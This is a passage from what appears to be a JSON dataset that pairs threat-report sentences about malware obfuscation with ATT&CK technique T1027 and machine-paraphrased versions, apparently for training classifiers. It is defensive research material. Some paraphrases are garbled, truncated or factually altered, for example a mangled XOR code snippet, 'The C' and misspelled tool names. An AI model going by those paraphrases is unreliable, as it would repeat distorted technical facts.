            "data_text": "The malicious dll then loads the encrypted shell code from the binary. The binary is decrypted to execute the final BUGJUICE payload."
        }
    ],
    "Messages are encrypted using AES with a static key": [
        {
            "tec_id": "T1027",
            "en_text": "Messages are encrypted using AES with a static key",
            "data_text": "Messages are encrypted using AES with static keys."
        }
    ],
    "The 2.0 versions require a dropper to decipher and launch the AES encrypted QUASARRAT payload": [
        {
            "tec_id": "T1027",
            "en_text": "The 2.0 versions require a dropper to decipher and launch the AES encrypted QUASARRAT payload",
            "data_text": "The 2.0 version requires a dropper to decrypt and execute the AES encrypted QUASARAT payload."
        }
    ],
    "After the payload is launched, the shellcode runs the following commands to prevent Microsoft Word from showing a recovery dialog:   Lastly, the shellcode overwrites the malicious file with a decoy document related to the Indian defense forces’ pay scale / matrix (Figure 3), displays it to the user and terminates the exploited instance of Microsoft Word": [
        {
            "tec_id": "T1027",
            "en_text": "After the payload is launched, the shellcode runs the following commands to prevent Microsoft Word from showing a recovery dialog:   Lastly, the shellcode overwrites the malicious file with a decoy document related to the Indian defense forces’ pay scale / matrix (Figure 3), displays it to the user and terminates the exploited instance of Microsoft Word",
            "data_text": "After the payload is enabled, the shell code executes the following command to prevent Microsoft Word from displaying the Recovery dialog box: Finally, the shellcode overwrites the malicious file with a decoy document related to the Indian Defence Force payroll level/matrix (Figure 3), marking it to the user and terminating the exploited Microsoft instance. Word"
        }
    ],
    "The code is obfuscated in order to hide any malicious activity on the remote server": [
        {
            "tec_id": "T1027",
            "en_text": "The code is obfuscated in order to hide any malicious activity on the remote server",
            "data_text": "Code obfuscated to hide malicious activity on the remote server."
        }
    ],
    "Bxaki obfuscated function": [
        {
            "tec_id": "T1027",
            "en_text": "Bxaki obfuscated function",
            "data_text": "Bxaki obfuscation function"
        }
    ],
    "This strangeness was related to values listed in newer BlackEnergy configuration files": [
        {
            "tec_id": "T1027",
            "en_text": "This strangeness was related to values listed in newer BlackEnergy configuration files",
            "data_text": "This anomaly relates to the values listed in the latest BlackEnergy configuration file."
        }
    ],
    "Evidence also supports the hypothesis that there is a encryption plugin for victim files (see below)": [
        {
            "tec_id": "T1027",
            "en_text": "Evidence also supports the hypothesis that there is a encryption plugin for victim files (see below)",
            "data_text": "It also supports the hypothesis that there is an encryption plug-in for victim files (see below)."
        }
    ],
    "Destructive dstr command in BE2 config file Also, on some machines, documents were encrypted, but no related plugin could be found": [
        {
            "tec_id": "T1027",
            "en_text": "Destructive dstr command in BE2 config file Also, on some machines, documents were encrypted, but no related plugin could be found",
            "data_text": "The destructive dstr command in the BE2 configuration file is also encrypted on some computers, but the associated plug-in cannot be found."
        }
    ],
    "It is prepended to the encrypted and encoded message": [
        {
            "tec_id": "T1027",
            "en_text": "It is prepended to the encrypted and encoded message",
            "data_text": "It is added to encrypted and encoded messages."
        }
    ],
    "The headers are XOR encrypted with <hdrXORKey1> and <hdrXORKey2> combined and reversed": [
        {
            "tec_id": "T1027",
            "en_text": "The headers are XOR encrypted with <hdrXORKey1> and <hdrXORKey2> combined and reversed",
            "data_text": "The header is encrypted with XOR. Encrypted with /hdrX.ORKey1 and <hdrX>ORKey2>Inverting and Inverting"
        }
    ],
    "Build Tool Most of CARBANAK’s strings are encrypted in order to make analysis more difficult": [
        {
            "tec_id": "T1027",
            "en_text": "Build Tool Most of CARBANAK’s strings are encrypted in order to make analysis more difficult",
            "data_text": "To make it more difficult to analyze most CARB fabrication tools, the string in the ANAK is encrypted."
        }
    ],
    "This build tool encrypts the binary’s strings with a fresh key for each build": [
        {
            "tec_id": "T1027",
            "en_text": "This build tool encrypts the binary’s strings with a fresh key for each build",
            "data_text": "This build tool encrypts the string in the binary with a new key for each build."
        }
    ],
    "Tool Type Internal Name Industry Name   Backdoor Poison Frog BONDUPDATER   Backdoor Glimpse Updated BONDUPDATER   Webshell HyperShell TwoFace loader   Webshell HighShell TwoFace payload   Webshell Minion TwoFace payload variant   DNS Hijacking Toolkit webmask Related to DNSpionage     Table 1": [
        {
            "tec_id": "T1027",
            "en_text": "Tool Type Internal Name Industry Name   Backdoor Poison Frog BONDUPDATER   Backdoor Glimpse Updated BONDUPDATER   Webshell HyperShell TwoFace loader   Webshell HighShell TwoFace payload   Webshell Minion TwoFace payload variant   DNS Hijacking Toolkit webmask Related to DNSpionage     Table 1",
            "data_text": "Tool Type Internal Name Industry Name Backdoor Poison BONDUPDATER Backdoor Blife Update BONDUPDATER Webshell 2 Face Loader Webshell HighShell 2 Face Payload Webshell Minions 2 Face Payload Variant DNS High-Jacking Toolkit Webmask DNS Payload Table 1 Related"
        }
    ],
    "The HyperShell and HighShell webshells are variants of what we track as TwoFace, with HyperShell being related to the TwoFace loader and HighShell being related to the TwoFace payload, as we reported in July 2017": [
        {
            "tec_id": "T1027",
            "en_text": "The HyperShell and HighShell webshells are variants of what we track as TwoFace, with HyperShell being related to the TwoFace loader and HighShell being related to the TwoFace payload, as we reported in July 2017",
            "data_text": "HyperShell and HighShell webshells are variants of being tracked by TwoFace, and as reported in July 2017, HyperShell is related to TwoFace loaders and HighShell is related to TwoFace payloads."
        }
    ],
    "Encryption consists of XOR with a hardcoded key for its configuration and RC4 with a predefined password for encrypting the victim’s data": [
        {
            "tec_id": "T1027",
            "en_text": "Encryption consists of XOR with a hardcoded key for its configuration and RC4 with a predefined password for encrypting the victim’s data",
            "data_text": "Encryption consists of an XOR with a hard-coded key for configuration and an RC4 with a predefined password for encrypting the victim's data."
        }
    ],
    "Configuration Config.ini is the file where the malware stores its encrypted configuration data": [
        {
            "tec_id": "T1027",
            "en_text": "Configuration Config.ini is the file where the malware stores its encrypted configuration data",
            "data_text": "ConfigurationConfig.ini is a file that stores configuration data that malware has encrypted."
        }
    ],
    "These requests are encrypted using the RC4 algorithm": [
        {
            "tec_id": "T1027",
            "en_text": "These requests are encrypted using the RC4 algorithm",
            "data_text": "These requests are encrypted using the RC4 algorithm."
        }
    ],
    "While performing the analysis on the delivery documents using the .sct file AppLocker bypass, we noticed the C# payload was functionally similar to the original RogueRobin payload": [
        {
            "tec_id": "T1027",
            "en_text": "While performing the analysis on the delivery documents using the .sct file AppLocker bypass, we noticed the C# payload was functionally similar to the original RogueRobin payload",
            "data_text": "While using the .sct file AppLocker bypass to analyze delivery documents, we found that the C# payload was functionally similar to the original RogueRobin payload."
        }
    ],
    "Figure 3 Targeted lure content In one of the documents, the victim is presented with what appears to be an obfuscated document with the NATO EOD seal and text alluding to the targeted nation state": [
        {
            "tec_id": "T1027",
            "en_text": "Figure 3 Targeted lure content In one of the documents, the victim is presented with what appears to be an obfuscated document with the NATO EOD seal and text alluding to the targeted nation state",
            "data_text": "Figure 3 In one document of the targeted handout content, the victim is presented with what appears to be an obfuscated document with a NATO EOD seal and text suggesting that it is a targeted country."
        }
    ],
    "The group clearly shows a preference for using a simple downloader like Zebrocy as first-stage payloads in these attacks": [
        {
            "tec_id": "T1027",
            "en_text": "The group clearly shows a preference for using a simple downloader like Zebrocy as first-stage payloads in these attacks",
            "data_text": "This group clearly shows a preference for using simple downloaders such as Zebrocy as a first-stage payload in these attacks."
        }
    ],
    "APT29 wrote the encrypted and base64-encoded PowerShell backdoor code into that property": [
        {
            "tec_id": "T1027",
            "en_text": "APT29 wrote the encrypted and base64-encoded PowerShell backdoor code into that property",
            "data_text": "APT29 has written PowerShell backdoor code encrypted and base64 encoded in its properties."
        }
    ],
    "When we converted the dates in the file strings from the Solar Hijri calendar to the Gregorian one, we found that they were close to the compilation times of the executables and also close to when Cadelle’s targets were initially compromised": [
        {
            "tec_id": "T1027",
            "en_text": "When we converted the dates in the file strings from the Solar Hijri calendar to the Gregorian one, we found that they were close to the compilation times of the executables and also close to when Cadelle’s targets were initially compromised",
            "data_text": "When we converted the date of the file string from the Solar Hijri calendar to the Gregorian calendar, we found that it was close to the compile time of the executable and close to the time when the destination of the Cadelle was first corrupted."
        }
    ],
    "WindowsDefender.ini – The Base64 encoded and obfuscated PowerShell script": [
        {
            "tec_id": "T1027",
            "en_text": "WindowsDefender.ini – The Base64 encoded and obfuscated PowerShell script",
            "data_text": "Windows Defender.ini – Base64 encoded and obfuscated PowerShell scripts"
        }
    ],
    "Some of the key obfuscation techniques used are:   Character Replacement: Several instances of character replacement and string reversing techniques (Figure 10) make analysis difficult": [
        {
            "tec_id": "T1027",
            "en_text": "Some of the key obfuscation techniques used are:   Character Replacement: Several instances of character replacement and string reversing techniques (Figure 10) make analysis difficult",
            "data_text": "Some of the major obfuscation techniques used include: Character replacement: Some character replacement and string inversion techniques (Figure 10) make analysis difficult."
        }
    ],
    "Figure 3: The first step of decryption will perform XOR on one byte using the previous adjacent byte, starting from the last byte and excluding the first byte  Figure 4: The second step uses RC4, using the first 0x20 bytes from the result of the first step as the RC4 key  Figure 5: Encrypted (Top) and decrypted (bottom) configuration file It is also important to note that while the loader component and the configuration file are located in the same directory (%windows%\\system32), the encrypted backdoor is located in a different directory (%Program Files%\\Common Files\\System\\ado)": [],
    "All strings used by the Trojan are encrypted with the XOR algorithm": [
        {
            "tec_id": "T1027",
            "en_text": "All strings used by the Trojan are encrypted with the XOR algorithm",
            "data_text": "All strings used by the Trojan horse are encrypted with the XOR algorithm."
        }
    ],
    "Next, the buffer is encrypted using the RC4 algorithm with the 50-byte key (also stored in the backdoor’s body)": [
        {
            "tec_id": "T1027",
            "en_text": "Next, the buffer is encrypted using the RC4 algorithm with the 50-byte key (also stored in the backdoor’s body)",
            "data_text": "The buffer is then encrypted with a 50-byte key (which is also stored in the body of the backdoor) using the RC4 algorithm."
        }
    ],
    "11 bytes of this buffer are encrypted with the XOR algorithm as follows: i = 0 while ( 1 ) {   crypted_buffer = (_BYTE *)this_->crypted_buffer;   if ( i gt;= this-gt;crypted_buffer_size - 4 ) // this-gt;crypted_buffer_size == 15     break;   ++i;   crypted_buffer[i + 4] ^= crypted_buffer[i & 3];  The generated buffer in encoded using the BASE64 alphabet, where the last two characters are replaced with “-” and “_”": [
        {
            "tec_id": "T1027",
            "en_text": "11 bytes of this buffer are encrypted with the XOR algorithm as follows: i = 0 while ( 1 ) {   crypted_buffer = (_BYTE *)this_->crypted_buffer;   if ( i gt;= this-gt;crypted_buffer_size - 4 ) // this-gt;crypted_buffer_size == 15     break;   ++i;   crypted_buffer[i + 4] ^= crypted_buffer[i & 3];  The generated buffer in encoded using the BASE64 alphabet, where the last two characters are replaced with “-” and “_”",
            "data_text": "The 11 bytes of this buffer are encrypted with the XOR algorithm as follows: While i = 0, (1) {crypted_details=(_BYTE *) this_->signed_details; if (iggt;=this-gt;t;t;t;twired_d_size -4) /this-gt;crypted_details=buffered_size; 4BAS-size; the last two letters will be replaced by \"buffered_size\" and 4BAS-size."
        }
    ],
    "Next, to the beginning of the BASE64 string a random BASE64 string with the length of 5 characters is added": [
        {
            "tec_id": "T1027",
            "en_text": "Next, to the beginning of the BASE64 string a random BASE64 string with the length of 5 characters is added",
            "data_text": "A 5-character arbitrary BASE64 string is then added to the beginning of the BASE64 string."
        }
    ],
    "The first 11 bytes of the received buffer are encrypted with the XOR algorithm": [
        {
            "tec_id": "T1027",
            "en_text": "The first 11 bytes of the received buffer are encrypted with the XOR algorithm",
            "data_text": "The first 11 bytes of the received buffer are encrypted with the XOR algorithm."
        }
    ],
    "Once it is encrypted using the XOR algorithm, the buffer is encoded with BASE64": [
        {
            "tec_id": "T1027",
            "en_text": "Once it is encrypted using the XOR algorithm, the buffer is encoded with BASE64",
            "data_text": "When encrypted using the XOR algorithm, the buffer is encoded as BASE64."
        }
    ],
    "The launcher module, obfuscated with the notorious Metasploit’s shikata_ga_nai encoder, is the same for all the droppers": [
        {
            "tec_id": "T1027",
            "en_text": "The launcher module, obfuscated with the notorious Metasploit’s shikata_ga_nai encoder, is the same for all the droppers",
            "data_text": "The launcher module obfuscated with the shikata_ga_nai encoder of the notorious metasploit is the same for all dropers."
        }
    ],
    "These redirects were implemented by adding two malicious scripts obfuscated by a tool similar to the Dean Edwards packer": [
        {
            "tec_id": "T1027",
            "en_text": "These redirects were implemented by adding two malicious scripts obfuscated by a tool similar to the Dean Edwards packer",
            "data_text": "This redirection was implemented by adding two malicious scripts obfuscated by a tool similar to Dean Edwards Packer."
        }
    ],
    "Many of the Fetch samples we analyzed attempted to obfuscate their functionality by encrypting their embedded strings using AES": [
        {
            "tec_id": "T1027",
            "en_text": "Many of the Fetch samples we analyzed attempted to obfuscate their functionality by encrypting their embedded strings using AES",
            "data_text": "Many of the Fetch samples we analyzed attempted to obfuscate features by encrypting built-in strings using AES."
        }
    ],
    "Although the activity was previously linked by others to the FIN7 threat actor group, our research suggests the activity is in fact espionage related and unlikely to be FIN7 related": [
        {
            "tec_id": "T1027",
            "en_text": "Although the activity was previously linked by others to the FIN7 threat actor group, our research suggests the activity is in fact espionage related and unlikely to be FIN7 related",
            "data_text": "Although the activity has previously been linked by a group of FIN7 threat actors by others, our study suggests that the activity is in fact related to spying and unlikely to be related to FIN7."
        }
    ],
    "The domain names differed but the script adheres to the same logic (including the logic function).” The DNSMessenger malware is an obfuscated and customized version of the popular DNS_TXT_PWNAGE.ps1 script available on GitHub and is also referred to by FireEye as POWERSOURCE": [
        {
            "tec_id": "T1027",
            "en_text": "The domain names differed but the script adheres to the same logic (including the logic function).” The DNSMessenger malware is an obfuscated and customized version of the popular DNS_TXT_PWNAGE.ps1 script available on GitHub and is also referred to by FireEye as POWERSOURCE",
            "data_text": "Although the domain names are different, the scripts adhere to the same logic (including logical functions).\" DNS Messenger malware is an obfuscated and custom version of the popular DNS_TXT_PWNAGE.ps1 script available on GitHub, also known as POWERSOURCE in FireE."
        }
    ],
    "Malicious obfuscated VBA code is executed when the macro is first enabled": [
        {
            "tec_id": "T1027",
            "en_text": "Malicious obfuscated VBA code is executed when the macro is first enabled",
            "data_text": "Malicious obfuscation VBA code is executed the first time a macro is used."
        }
    ],
    "The current version, HawkEye Reborn v9 has been modified from earlier versions and heavily obfuscated to make analysis more difficult.The email campaigns that have been observed feature characteristics that are consistent with what is commonly seen with malspam campaigns, with the emails purporting to be associated with various documents such as invoices, bills of materials, order confirmations, and other corporate functions": [
        {
            "tec_id": "T1027",
            "en_text": "The current version, HawkEye Reborn v9 has been modified from earlier versions and heavily obfuscated to make analysis more difficult.The email campaigns that have been observed feature characteristics that are consistent with what is commonly seen with malspam campaigns, with the emails purporting to be associated with various documents such as invoices, bills of materials, order confirmations, and other corporate functions",
            "data_text": "The current version of Hawkeye Rebirth v9 has been modified in previous versions and heavily obfuscated to make analysis more difficult.Observed email campaigns typically have features that match the characteristics seen in Mulspam campaigns, and email is considered to be related to invoices, Bill of Materials, Order Confirmation, and other corporate functions."
        }
    ],
    "After decompiling it from the PE file, it is heavily obfuscated and still almost unreadable.We deobfuscated the script to understand how the infection process works": [
        {
            "tec_id": "T1027",
            "en_text": "After decompiling it from the PE file, it is heavily obfuscated and still almost unreadable.We deobfuscated the script to understand how the infection process works",
            "data_text": "After being compiled from a PE file, it is severely obfuscated and still barely readable.I decoded the script to understand how the infection process works."
        }
    ],
    "The AutoIT script is offering a lot of other functions which are not used in this campaign, like anti-virtual machine detection, USB drive infection and others.The final payload — which we found in the AutoIT PE file resource section and was started by the process-hollowing shellcode — is a .NET PE file that's obfuscated with ConfuserEx": [
        {
            "tec_id": "T1027",
            "en_text": "The AutoIT script is offering a lot of other functions which are not used in this campaign, like anti-virtual machine detection, USB drive infection and others.The final payload — which we found in the AutoIT PE file resource section and was started by the process-hollowing shellcode — is a .NET PE file that's obfuscated with ConfuserEx",
            "data_text": "AutoIT scripts provide many other features that are not used in this campaign, such as anti-virtual machine detection, USB drive infections, and so on.Final payload - The ITPE file resource section initiated by the process holing shell code found by Auto is .Example NET PE file obfuscated with Confuser"
        }
    ],
    "In our analysis, the macro is obfuscated, character by character, using the decimal ASCII code": [
        {
            "tec_id": "T1027",
            "en_text": "In our analysis, the macro is obfuscated, character by character, using the decimal ASCII code",
            "data_text": "In our analysis, macros are obfuscated on a character-by-character basis using decimal ASCII codes."
        }
    ],
    "Code snippet of the obfuscated document After deobfuscation, we can see that the payload is written in the Perl programming language": [
        {
            "tec_id": "T1027",
            "en_text": "Code snippet of the obfuscated document After deobfuscation, we can see that the payload is written in the Perl programming language",
            "data_text": "After unobfuscating the code snippet of the obfuscated document, you can see that the payload was written in the Perl programming language."
        }
    ],
    "There are two forms of encrypted strings: an RSA256-encrypted string, and custom base64-encoded and RSA256-encrypted string": [
        {
            "tec_id": "T1027",
            "en_text": "There are two forms of encrypted strings: an RSA256-encrypted string, and custom base64-encoded and RSA256-encrypted string",
            "data_text": "Encrypted strings have two formats: RSA256 encryption string and custom base64 encoding and RSA256 encryption string."
        }
    ],
    "All strings below are encrypted via AES256 and base64 encoding": [
        {
            "tec_id": "T1027",
            "en_text": "All strings below are encrypted via AES256 and base64 encoding",
            "data_text": "All strings below are encrypted via AES256 and base64 encoding."
        }
    ],
    "Its developer used the open source Invoke-Obfuscation tool to obfuscate this PowerShell script, specifically using the COMPRESS technique offered by Invoke-Obfuscation": [
        {
            "tec_id": "T1027",
            "en_text": "Its developer used the open source Invoke-Obfuscation tool to obfuscate this PowerShell script, specifically using the COMPRESS technique offered by Invoke-Obfuscation",
            "data_text": "Developers obfuscated this PowerShell script using an open-source call-obfuscation tool, particularly the COMPRESS technology provided by call-obfuscation."
        }
    ],
    "At face value, this current variant of OopsIE has a vast majority of its strings obfuscated, which can be deobfuscated by splitting the strings using the hyphen as a delimiter, treating each split value as an integer, subtracting one from each integer and converting each into a character": [
        {
            "tec_id": "T1027",
            "en_text": "At face value, this current variant of OopsIE has a vast majority of its strings obfuscated, which can be deobfuscated by splitting the strings using the hyphen as a delimiter, treating each split value as an integer, subtracting one from each integer and converting each into a character",
            "data_text": "At face value, this current variant of OopsIE obfuscates most of the strings and can be unobfuscated by using a hyphen as a separator, treating each division value as an integer, subtracting one from each integer, and converting each string to a character."
        }
    ],
    "The Trojan accesses two resources, named Sch and VBS that contains obfuscated strings that contain the command to create the scheduled task and the VBScript to run": [
        {
            "tec_id": "T1027",
            "en_text": "The Trojan accesses two resources, named Sch and VBS that contains obfuscated strings that contain the command to create the scheduled task and the VBScript to run",
            "data_text": "The Trojan horse accesses two resources: Sch and VBS. Sch and VBS include obfuscated strings that contain commands that create scheduled tasks and VBScripts to run."
        }
    ],
    "A closer examination revealed the obfuscation used by the OilRig group in these QUADAGENT samples were likely the result of using an open-source toolkit called Invoke-Obfuscation": [
        {
            "tec_id": "T1027",
            "en_text": "A closer examination revealed the obfuscation used by the OilRig group in these QUADAGENT samples were likely the result of using an open-source toolkit called Invoke-Obfuscation",
            "data_text": "A closer examination revealed that the obfuscation used by the OilRig group in these QUADAGENT samples was likely a result of using an open-source toolkit called Invoke-Obckidation."
        }
    ],
    "This tool was originally intended to aid defenders in simulating obfuscated PowerShell commands to better their defenses": [
        {
            "tec_id": "T1027",
            "en_text": "This tool was originally intended to aid defenders in simulating obfuscated PowerShell commands to better their defenses",
            "data_text": "The tool was originally designed to enhance defense by simulating Obfuscated PowerShell commands by defenders."
        }
    ],
    "Invoke-Obfuscation calls the variable obfuscation technique used by the actors to obfuscate this script Random Case + {} + Ticks, which changes all variables in the script to have randomly cased characters, to be surrounded in curly braces and to include the tick (`) character, which is ignored in by PowerShell": [],
    "Invoke-Obfuscation calls the string obfuscation used by the actors to further obfuscate this script Reorder, which uses the string formatting functionality within PowerShell to reconstruct strings from out of order substrings (ex": [
        {
            "tec_id": "T1027",
            "en_text": "Invoke-Obfuscation calls the string obfuscation used by the actors to further obfuscate this script Reorder, which uses the string formatting functionality within PowerShell to reconstruct strings from out of order substrings (ex",
            "data_text": "Invoke-Obflation invokes string obfuscation used by the actor to further obfuscate this script. This obfuscation uses the formatting of strings within the PowerShell to reconstruct strings from misordered substrings, for example:"
        }
    ],
    "By applying two specific obfuscation techniques within Invoke-Obfuscation, we were able to create an obfuscated PowerShell script that was very similar to the QUADAGENT payloads delivered in the attacks discussed in this blog": [
        {
            "tec_id": "T1027",
            "en_text": "By applying two specific obfuscation techniques within Invoke-Obfuscation, we were able to create an obfuscated PowerShell script that was very similar to the QUADAGENT payloads delivered in the attacks discussed in this blog",
            "data_text": "Two specific obfuscation techniques were applied within Invoke-Obflation to generate obfuscation PowerShell scripts that are very similar to the QUADAGENT payload provided in the attacks discussed in this blog."
        }
    ],
    "All the strings and settings were encrypted and obfuscated": [
        {
            "tec_id": "T1027",
            "en_text": "All the strings and settings were encrypted and obfuscated",
            "data_text": "All strings and settings are encrypted and obfuscated."
        }
    ],
    "The configuration and strings are encrypted using 3DES and Base64 encoding": [
        {
            "tec_id": "T1027",
            "en_text": "The configuration and strings are encrypted using 3DES and Base64 encoding",
            "data_text": "Configurations and strings are encrypted using 3DES and Base64 encoding."
        }
    ],
    "The C&C server then replies with the encrypted serialized configuration": [
        {
            "tec_id": "T1027",
            "en_text": "The C&C server then replies with the encrypted serialized configuration",
            "data_text": "The C"
        }
    ],
    "The shellcode is not encrypted but is obfuscated": [
        {
            "tec_id": "T1027",
            "en_text": "The shellcode is not encrypted but is obfuscated",
            "data_text": "The shell code is not encrypted but obfuscated."
        }
    ],
    "Decrypting the Configuration As previously mentioned, the real configuration data is stored in the first stage shellcode but it is not stored in cleartext, but encrypted and compressed": [
        {
            "tec_id": "T1027",
            "en_text": "Decrypting the Configuration As previously mentioned, the real configuration data is stored in the first stage shellcode but it is not stored in cleartext, but encrypted and compressed",
            "data_text": "Decryption of configuration As mentioned earlier, the actual configuration data is stored in the Phase 1 shell code, but not in plain text, but is encrypted and compressed."
        }
    ],
    "The configuration data is encrypted with the same algorithm described previously by JPCert but using a different XOR value": [
        {
            "tec_id": "T1027",
            "en_text": "The configuration data is encrypted with the same algorithm described previously by JPCert but using a different XOR value",
            "data_text": "The configuration data is encrypted with the same algorithm as previously described in JPCert, but uses different XOR values."
        }
    ],
    "The configuration blob is encoded using a simple single-byte XOR scheme": [
        {
            "tec_id": "T1027",
            "en_text": "The configuration blob is encoded using a simple single-byte XOR scheme",
            "data_text": "Configuration blobs are encoded using a simple single-byte XOR scheme."
        }
    ],
    "KopiLuwak In November 2016, Kaspersky Lab observed a new round of weaponized macro documents that dropped a new, heavily obfuscated Javascript payload that we named KopiLuwak (one of the rarest and most expensive types of coffee in the world)": [
        {
            "tec_id": "T1027",
            "en_text": "KopiLuwak In November 2016, Kaspersky Lab observed a new round of weaponized macro documents that dropped a new, heavily obfuscated Javascript payload that we named KopiLuwak (one of the rarest and most expensive types of coffee in the world)",
            "data_text": "Kofi Luwak In November 2016, the Kaspersky Institute observed a new weaponized macro document that dropped a new obfuscated JavaScript payload that we named Kofi Luwak (one of the world's rarest and most expensive types of coffee)."
        }
    ],
    "The payload (abbad7acd…) is an executable that appears to have been created by a VBScript to Executable tool and further obfuscated with a cryptor": [
        {
            "tec_id": "T1027",
            "en_text": "The payload (abbad7acd…) is an executable that appears to have been created by a VBScript to Executable tool and further obfuscated with a cryptor",
            "data_text": "payload(abbad7acd…) is an executable created by the VBScript to Executable tool for the executable and appears to have been obfuscated with an encryption device."
        }
    ],
    "Figure 3: no detections for SpeakUp in Virus Total In an attempt to endure the investigation process by security researchers, the second stage payload was encoded with salted base64": [
        {
            "tec_id": "T1027",
            "en_text": "Figure 3: no detections for SpeakUp in Virus Total In an attempt to endure the investigation process by security researchers, the second stage payload was encoded with salted base64",
            "data_text": "Figure 3: No SpeechUp in Virus Total To withstand the security researcher's investigation, a two-stage payload was encoded into a salted base 64."
        }
    ],
    "Some strings are obfuscated with XOR x56": [
        {
            "tec_id": "T1027",
            "en_text": "Some strings are obfuscated with XOR x56",
            "data_text": "Some strings are obfuscated with XOR x56."
        }
    ],
    "These files are stored within an 217kb encrypted cab file in the dropper’s resources under the name “A”": [
        {
            "tec_id": "T1027",
            "en_text": "These files are stored within an 217kb encrypted cab file in the dropper’s resources under the name “A”",
            "data_text": "These files are stored in the dropper's resources under the name \"A\" in a 217 kb encrypted cap file."
        }
    ],
    "The cab file was encrypted and decrypted using a simple xor cipher with a rotating 16 byte key: \\x36\\x11\\xdd\\x08\\xac\\x4b\\x72\\xf8\\x51\\x04\\x68\\x2e\\x3e\\x38\\x64\\x32": [
        {
            "tec_id": "T1027",
            "en_text": "The cab file was encrypted and decrypted using a simple xor cipher with a rotating 16 byte key: \\x36\\x11\\xdd\\x08\\xac\\x4b\\x72\\xf8\\x51\\x04\\x68\\x2e\\x3e\\x38\\x64\\x32",
            "data_text": "The cab file was encrypted and decrypted using a simple xor password with a rotating 16-byte key. \\x36\\x11\\xdd\\x08\\x4b\\x72\\xf8\\x51\\x68\\x2e\\x3e\\x38\\x64\\x32"
        }
    ],
    "This is encrypted by RC4, using the key {0xb5, 0x78, 0x62, 0x52, 0x98, 0x3e, 0x24, 0xd7, 0x3b, 0xc6, 0xee, 0x7c, 0xb9, 0xed, 0x91, 0x62}": [
        {
            "tec_id": "T1027",
            "en_text": "This is encrypted by RC4, using the key {0xb5, 0x78, 0x62, 0x52, 0x98, 0x3e, 0x24, 0xd7, 0x3b, 0xc6, 0xee, 0x7c, 0xb9, 0xed, 0x91, 0x62}",
            "data_text": "Encrypted by RC4, key {0xb5, 0x78, 0x62, 0x52, 0x98, 0x3e, 0x24, 0xd7, 0x3b, 0xc6, 0xee, 0x7c, 0xb9, 0x91, 0x62)."
        }
    ],
    "We’ve identified two such files: settings.db sdfg3d.db Here’s how such a database file appears:  These are BASE64 encoded and use the same RC4 encryption key as the malware configuration": [
        {
            "tec_id": "T1027",
            "en_text": "We’ve identified two such files: settings.db sdfg3d.db Here’s how such a database file appears:  These are BASE64 encoded and use the same RC4 encryption key as the malware configuration",
            "data_text": "I checked these two files. settings.dbsdfg3d.dbHow these database files appear: This password is BASE64 encoded and uses the same RC4 encryption key as the malware configuration."
        }
    ],
    "The CARROTBAT malware family is a somewhat unique dropper and while it supports various types of decoy documents, and employs rudimentary command obfuscation, it should be made clear that it is not sophisticated": [
        {
            "tec_id": "T1027",
            "en_text": "The CARROTBAT malware family is a somewhat unique dropper and while it supports various types of decoy documents, and employs rudimentary command obfuscation, it should be made clear that it is not sophisticated",
            "data_text": "The CARROBAT malware family is a rather unique dropper, supporting various types of bait documents and using rudimentary instruction obfuscation, but it should be made clear that it is not sophisticated."
        }
    ],
    "Embedded Trojan This Trojan loaded by the first payload contains several embedded executables that it uses to ultimately download and execute a secondary payload, as well as downloading and opening a decoy document": [
        {
            "tec_id": "T1027",
            "en_text": "Embedded Trojan This Trojan loaded by the first payload contains several embedded executables that it uses to ultimately download and execute a secondary payload, as well as downloading and opening a decoy document",
            "data_text": "Built-in Trojan This Trojan loaded by the first payload contains several built-in executable files that you can use to download and open the Bait document."
        }
    ],
    "HttpBrowser's executable code may be obfuscated through structured exception handling and return-oriented programming": [
        {
            "tec_id": "T1027",
            "en_text": "HttpBrowser's executable code may be obfuscated through structured exception handling and return-oriented programming",
            "data_text": "The execution code of the HTTP browser may be obfuscated through structured exception processing and return-oriented programming."
        }
    ],
    "Navigating to the web page manually to view:source reveals the code, which at the time of writing happened to not be obfuscated in any significant way": [
        {
            "tec_id": "T1027",
            "en_text": "Navigating to the web page manually to view:source reveals the code, which at the time of writing happened to not be obfuscated in any significant way",
            "data_text": "You can view it by going to the web page manually.The source displays the code. Code was not obfuscated when writing code."
        }
    ],
    "All third-party trademarks referenced by Cofense whether in logo form, name form or product form, or otherwise, remain the property of their respective holders, and use of these trademarks in no way indicates any relationship between Cofense and the holders of the trademarks": [
        {
            "tec_id": "T1027",
            "en_text": "All third-party trademarks referenced by Cofense whether in logo form, name form or product form, or otherwise, remain the property of their respective holders, and use of these trademarks in no way indicates any relationship between Cofense and the holders of the trademarks",
            "data_text": "All third-party trademarks referred to by Coffense, regardless of logo, name, or product form, remain the property of their respective owners, and their use does not represent the relationship between Coffence and the proprietor of the trade mark."
        }
    ],
    "Figure 7: The same de-obfuscated code as Figure 2 The only other script content of the blog-page[.]html is an empty script section": [
        {
            "tec_id": "T1027",
            "en_text": "Figure 7: The same de-obfuscated code as Figure 2 The only other script content of the blog-page[.]html is an empty script section",
            "data_text": "Figure 7: Decryption code, such as the only other script content [] on the blog page in Figure 2.]html is an empty script section."
        }
    ],
    "PlayList.vbs contains the obfuscated codes, which it executes after decrypting the obfuscations.": [
        {
            "tec_id": "T1027",
            "en_text": "PlayList.vbs contains the obfuscated codes, which it executes after decrypting the obfuscations.",
            "data_text": "PlayList.vbs contains obfuscated code and executes it after decrypting it."
        }
    ],
    "Once executed, Vcrodat loads an encrypted payload on to the victim’s computer.": [
        {
            "tec_id": "T1027",
            "en_text": "Once executed, Vcrodat loads an encrypted payload on to the victim’s computer.",
            "data_text": "Once executed, Vcrodat loads the encrypted payload onto the victim's computer."
        }
    ],
    "Figure 3 shows this webshell’s code that will run supplied JScript provided in base64 encoded format within the URL within a parameter": [
        {
            "tec_id": "T1027",
            "en_text": "Figure 3 shows this webshell’s code that will run supplied JScript provided in base64 encoded format within the URL within a parameter",
            "data_text": "Figure 3 shows the code for this web shell to run the supplied JScript provided in base64 encoding format within the URL within the parameter."
        }
    ],
    "The file uses a character insertion obfuscation technique, making it appear to contain Chinese characters.": [
        {
            "tec_id": "T1027",
            "en_text": "The file uses a character insertion obfuscation technique, making it appear to contain Chinese characters.",
            "data_text": "The file appears to contain Chinese characters using character insertion obfuscation techniques."
        }
    ],
    "The JavaScript is heavily obfuscated. The first variable—a—is an array of obfuscated values": [
        {
            "tec_id": "T1027",
            "en_text": "The JavaScript is heavily obfuscated. The first variable—a—is an array of obfuscated values",
            "data_text": "JavaScript is very obfuscated. The first variable, a, is an obfuscated array of values."
        }
    ],
    "This shellcode is decrypted in memory through EQENDT32.EXE": [
        {
            "tec_id": "T1027",
